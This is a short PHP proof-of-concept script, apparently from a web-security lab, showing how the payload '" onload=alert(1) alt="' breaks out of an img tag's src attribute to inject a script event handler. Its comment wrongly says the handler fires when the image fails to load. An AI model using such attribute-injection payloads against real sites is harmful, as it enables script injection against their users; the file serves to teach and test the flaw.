<?php
// You can use https://onlinephp.io/ to run this code
// Server side PoC

$payload = '" onload=alert(1) alt="';
$result = '<img src="/resources/images/tracker.gif?searchTerms="'.$payload.'"my0op2k8y>';

echo $result;

/*putting `" onload=alert(1) alt="` will result in:

<img src="/resources/images/tracker.gif?searchTerms="" onload=alert(1) alt=""my0op2k8y>

This will tell the browser to execute `alert(1)` when the <img> throws an error upon loading

*/